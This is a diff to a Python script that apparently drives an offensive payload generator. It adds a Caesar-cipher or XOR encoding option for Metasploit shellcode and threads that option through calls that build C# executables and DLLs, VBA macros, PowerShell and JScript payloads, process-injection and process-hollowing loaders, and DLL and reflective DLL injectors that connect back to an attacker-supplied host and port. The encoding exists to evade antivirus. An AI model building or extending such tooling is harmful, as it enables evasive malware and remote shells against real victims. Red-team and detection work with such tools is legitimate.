@@ -184,12 +184,29 @@ def getData():
         config_data["payload_type"] = []
 
 
+    ## Get shellcode encoding technique
+    enc_technique = input(f"""\nShellcode encoding technique:
+[1] Cesar Cipher (default)
+[2] XOR
+[>] Select technique: """)
+    
+    if (not enc_technique):
+        config_data["enc_technique"] = "cesar"
+    elif (enc_technique =="cesar" or int(enc_technique) == 1):
+        config_data["enc_technique"] = "cesar"
+    elif (enc_technique =="cxor" or int(enc_technique)== 2):
+        config_data["enc_technique"] = "xor"
+    else:
+        config_data["enc_technique"] = "cesar"
+
+
     print(f"""Provided data:
         Lhost: {_lhost}
         Lport: {_lport}
         Arch: {_arch}
         MSF payload: {config_data["msf_payload"]}
         Payload types: {config_data["payload_type"]}
+        Shellcode encoding: {config_data["enc_technique"]}
         """)
     
     # write changes to config file
@@ -279,12 +296,12 @@ def main():
                     generateMetasploitShellcodes(config_data["lhost"],config_data["lport"], msf_payload, arch)
 
                     #### Generating payloads
-                    c_sharp.generateCPayload(shellcodes["c_shellcode"], arch)
-                    c_sharp.generateCDllPayload(shellcodes["c_shellcode"], arch)
+                    c_sharp.generateCPayload(config_data["enc_technique"], shellcodes["c_shellcode"], arch)
+                    c_sharp.generateCDllPayload(config_data["enc_technique"], shellcodes["c_shellcode"], arch)
                     ps.generatePsPayload(shellcodes["ps_shellcode"], arch)
                     ps.generatePsDllPayload(config_data["lhost"], arch)
                     vba.generateMacroPayloadWithPS(config_data['lhost'], 80, arch) # requires PS payloads
-                    vba.generateMacroPayload(shellcodes["vba_shellcode"], arch) 
+                    vba.generateMacroPayload(config_data["enc_technique"], shellcodes["vba_shellcode"], arch) 
                     jscript.generateJScriptPayload(config_data["lhost"], config_data["lport"]) # requires managed DLL created manually
                     
 
@@ -305,8 +322,8 @@ def main():
                         print("[+] Creating output process migration directory")
                         os.mkdir(os.getcwd()+output_dir)
 
-                    pm.generateProcessInjection(shellcodes["c_shellcode"], arch)
-                    pm.generateProcessHollowing(shellcodes["c_shellcode"], arch)
+                    pm.generateProcessInjection(config_data["enc_technique"], shellcodes["c_shellcode"], arch)
+                    pm.generateProcessHollowing(config_data["enc_technique"], shellcodes["c_shellcode"], arch)
                     pm.dllInection(config_data["lhost"], config_data["lport"], arch)
                     pm.reflectiveDllInjection(config_data["lhost"], config_data["lport"], arch)
 
